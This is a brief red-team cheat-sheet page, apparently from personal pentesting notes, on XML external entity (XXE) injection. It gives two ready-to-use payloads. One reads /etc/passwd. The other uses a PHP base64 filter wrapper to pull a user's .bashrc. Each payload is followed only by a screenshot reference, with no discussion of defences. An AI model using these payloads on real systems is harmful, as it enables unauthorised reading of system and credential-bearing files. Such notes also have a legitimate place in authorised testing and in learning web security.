---
title: XXE
parent: Web Attack
grand_parent: Red Team
---

<details markdown="1">
<summary>XXE</summary>
#### Example:
#### read /etc/passwd

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
<name>hoge</name><tel>12345678901</tel><email>&xxe;</email><password>hoge</password></root>
```
![](../../assets/images/Pasted%20image%2020260507093552.png)

#### read .bashrc

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/saket/.bashrc">]>
<root>
<name>hoge</name><tel>12345678901</tel><email>&xxe;</email><password>hoge</password></root>
```
![](../../assets/images/Pasted%20image%2020260507093608.png)

</details>

---

Next
